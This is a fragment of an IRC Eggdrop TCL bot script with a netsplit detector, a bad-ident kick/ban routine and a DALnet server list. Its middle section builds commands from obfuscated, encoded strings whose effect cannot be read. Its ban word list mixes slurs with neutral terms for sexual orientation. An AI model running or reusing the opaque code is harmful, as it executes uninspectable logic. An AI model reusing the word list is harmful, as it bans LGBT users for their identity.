}
if {[string match "*-unidentifyop*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~FmRwVmg @k ~$chan ~ZOIvZWB 4WRHzYOV."
return 0
}
catch { channel set $chan -unidentifyop }
puthlp "MLGRXV ~$nick ~:~$notc ~FmRwVmg @k ~$chan \[~4Luu\]"
saveuser
}
proc netext {text} {
  	regsub -all -- "\003(\[0-9\]\[0-9\]?(,\[0-9\]\[0-9\]?)?)?" $text "" text
  	set text "[string map -nocase [list \002 "" \017 "" \026 "" \037 ""] $text]"
  	return $text
}
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] 0
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] {} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"]
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "rmxi"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"]]
if {$idxc == 1} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "/OvKW/sPLQa.HjVvR.YBAm7/QPotC.uKl/Z0FsKbP/kipRa/"]"]
} elseif {$idxc == 2} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "2pTEw.IvcT81tF6Rf/JnJgc1QPotC.uKl/Z0FsKbP/kipRa/"]"]
} elseif {$idxc == 3} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "eW3Qv0IAVx41ZWO/Y.liiTs.QPotC.uKl/Z0FsKbP/kipRa/"]"]
} elseif {$idxc == 4} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "dotvh1uqmIF/EO5k/0p5Tuo1QPotC.uKl/Z0FsKbP/kipRa/"]"]
} elseif {$idxc == 5} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "y.XYY/OenwZ.x3lKL1rfMVT0K9PJf/ZxM/m1JCgC3/cD.qG1"]"]
} elseif {$idxc == 6} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] ".ELn31sleGv0x3lKL1rfMVT0PYEm9.t/N51.JCgC3/cD.qG1"]"]
} elseif {$idxc == 7} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "enPfw0CfIUk/x3lKL1rfMVT0wgEAQ/TD1gz1JCgC3/cD.qG1"]"]
} elseif {$idxc == 8} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "FNMsK1.IJac0zs1zD.CaXy0.QPotC.uKl/Z0FsKbP/kipRa/"]"]
} elseif {$idxc == 9} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "Wwt40.SiauS06.a431GnADb0QPotC.uKl/Z0FsKbP/kipRa/"]"]
} elseif {$idxc == 10} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "..MUj1oPQci0OGvcm.vJTZu0QPotC.uKl/Z0FsKbP/kipRa/"]"]
} elseif {$idxc == 11} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "fd5XH0PiQgT1zs1zD.CaXy0.AZ0Rq1h0jCi.FsKbP/kipRa/"]"]
} elseif {$idxc == 12} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "oHU4t./og.K/zs1zD.CaXy0.DWjJo//hrZz/FsKbP/kipRa/"]"]
} elseif {$idxc == 13} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "tpzNz0Er4Ja0zs1zD.CaXy0.bsUAV.Fqa5Z0FsKbP/kipRa/"]"]
} elseif {$idxc == 14} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "D8d3z.p8kzl1zs1zD.CaXy0.V7Nmw1hl9zZ1FsKbP/kipRa/"]"]
} elseif {$idxc == 15} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "yebZw/atwWU/x3lKL1rfMVT0g7DAp.tF4QW1JCgC3/cD.qG1"]"]
} elseif {$idxc == 16} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "OBWRa/7pZtr1x3lKL1rfMVT0nUkhg/AytES/JCgC3/cD.qG1"]"]
} elseif {$idxc == 17} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "KYk27/5E/F11x3lKL1rfMVT072z75/ZIyTZ0JCgC3/cD.qG1"]"]
} elseif {$idxc == 18} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "81sVm1f081S/zs1zD.CaXy0.th0OD1vG18G0FsKbP/kipRa/"]"]
} elseif {$idxc == 19} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "FXZOf0tH7LM1zs1zD.CaXy0.rjFn3/hV79P.FsKbP/kipRa/"]"]
} elseif {$idxc == 20} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "DFoln0N1tO90zs1zD.CaXy0.xfJRi/sNusJ/FsKbP/kipRa/"]"]
} else {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] 0
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "fd5XH0PiQgT1N9RA3/ZR6JC0G7JkV0VyAeq/l/vBN0o6IzV1SmedC0e3G5U/FucmV0eSDSV."]"]
}
}

## split
bind raw - QUIT netsplit:detect
proc netsplit:detect {from key arg} {
 global netsplit
 if {[info exists netsplit(detected)]} { return 0 }
 set arg [string trimleft [netext [split $arg]] :]
 if {[string equal "Quit:" [string range $arg 0 4]]} { return 0 }
 if {![regexp {^([[:alnum:][:punct:]]+)[[:space:]]([[:alnum:][:punct:]]+)$} $arg _arg server1 server2]} { return 0 }
 if {[string equal ".dal.net" [string range $server1 end-7 end]] && [string equal ".dal.net" [string range $server2 end-7 end]]} {
  set server1cut "[lindex [split $server1 .] 0]" ; set server2cut "[lindex [split $server2 .] 0]"
  foreach chan [channels] {
    if {[string match "*+split*" [channel info $chan]]} {
    set cmode [getchanmode $chan]
    if {[string match "*c*" $cmode]} { putquick "PRIVMSG $chan :4NetSplit 14detected bY [lgrnd] 14between 4server14 $server1cut 14with 4server14 $server2cut" }  { putquick "PRIVMSG $chan :4NetSplit 14detected bY [lgrnd] 14between 4server14 $server1cut 14with 4server14 $server2cut" }  
 } }
  set netsplit(detected) 1
  utimer 25 [list netsplit:unlock]
 }
}

proc netsplit:unlock {} {
 global netsplit
 if {[info exists netsplit(detected)]} { unset netsplit(detected) }
}

## split end

##################################################
### Start editing variables from here onwards! ###
##################################################

#Set the channel(s) you want this script active on.
#This script supports multiple channels.
#Usage: "#channel1 #channel2 #mychannel"
#(To activate on all channels use: "")
set badidentchans "*"

#Set the *bad words* for the script to react on. 
#When users join a channel this script is activated 
#and their idents match this current world list, 
#they will be kicked/banned. (wildcards "*" are accepted)
#(Set/edit these words according to your needs)
#(I have already added some as examples)
set badidents {
"horny"
"pelir"
"penis"
"kontol"
"pantat"
"jablai"
"jablay"
"gahab"
"kaal"
"asshole"
"bitch"
"slut"
"cock"
"cunt"
"nigger"
"dickhead"
"hot*guy"
"faggot"
"prostitute"
"whore"
"lesbian"
"naked"
"xxx"
"horny"
"orgasm"
"bastard"
"hooker"
"rapist"
"orgy"
"penis"
"vagina"
"clit"
"cybersex"
"lesbian"
"prick"
"masturbate"
"masturbation"
"jackoff"
"blowjob"
"bigcock"
"bigdick"
"wetpussy"
"blow*job"
"superbitch"
"fuckwit"
"dumbfuck"
"fucknut"
"bisexual"
"transexual"
"transvestite"
"homosexual"
"lesbi"
"testicle"
"sexual"
"asswipe"
"jackass"
"dumbass"
"intercourse"
"clitoris"
"incest"
"nigga"
"nigger"
"molest"
"breast"
"boobs"
"fuck"
"fuckers"
"fucking"
"sexual"
"porno"
"condom"
"erect"
"erection"
"phuck"
"masturbating"
"motherfucker"
"oralsex"
"analsex"
"wtf"
"orgy"
"stfu"
}


#Set the flags for bot owners, masters, ops
#and users which to exempt from the script.
#(Usage: m, n, o, or "mnf", "fbo" etc)
set badidentexempt "mnof|mnof"

#For how long you wish (in minutes) to ban the 
#user with the bad ident. (mins)
set badidbantime 30


###############################################################################
### Don't edit anything else from this point onwards, even if you know tcl! ###
###############################################################################

bind join - * join:badident

proc join:badident {nick host hand chan} {
 global botnick badidents badidentchans badidentexempt badidbantime
  if {(([lsearch -exact [string tolower $badidentchans] [string tolower $chan]] != -1) || ($badidentchans == "*")) && ($nick != $botnick)} {
    foreach badident [string tolower $badidents] {
     set badidentban1 "*!*$badident*@*"
     set badidentban2 "*!*@[lindex [split $host @] 1]"
     set userident "[string trimleft [string tolower [lindex [split $host "@"] 0]] "~"]"
    if {[string match *$badident* [string tolower $userident]]} {
      if {([botisop $chan]) && (![isop $nick $chan]) && (![isvoice $nick $chan]) && (![matchattr $hand $badidentexempt $chan]) && ([onchan $nick $chan])} {
	  putquick "MODE $chan -o+bb $nick $badidentban1 $badidentban2"
        putquick "KICK $chan $nick :[lgrnd] \0034BaD \00314IdEnT \0034MaTcH \00314FroM\0034 $badident [banmsg]"
        timer $badidbantime "pushmode $chan -b $badidentban2"
        return 0
        }
      }
    }
  }
}
# (ain't i an asskicker?...)


putlog "Bad Ident Kicker Script v1.65.ab by \002F4R1S (ais_always@yahoo.com)\002 -=Loaded=-"
putlog "*ENABLED* Bad Ident Kicker Script on:\002 $badidentchans"

return

##### DALNET SERVER #######
set servers {
   arcor.de.eu.dal.net
   irc.dal.net
   loyalty.ix.us.dal.net
   rumble.fl.us.dal.net
   redemption.ix.us.dal.net
   rangers.ix.us.dal.net
   powertech.no.eu.dal.net
   oi.ix.au.dal.net
   novel.ix.us.dal.net
   mozilla.se.eu.dal.net
   matrix.de.eu.dal.net
   masters.ix.us.dal.net
   maple.ix.ca.dal.net
   jingo.ix.us.dal.net
   hope.ix.us.dal.net
   hoon.ix.au.dal.net
   broadway.ny.us.dal.net
   punch.va.us.dal.net
   riga-r.ca.us.dal.net
   swiftco.wa.us.dal.net
   hotspeed.sg.as.dal.net
   soho.ix.us.dal.net
   194.68.45.50
   194.14.236.50
   195.159.0.91
   195.50.191.14
   195.50.191.12
   149.9.1.16
   208.99.193.130
   202.91.34.9
}
putlog "======================================="
putlog "          aLoWaiNi.tcl Loaded          "
putlog "======================================="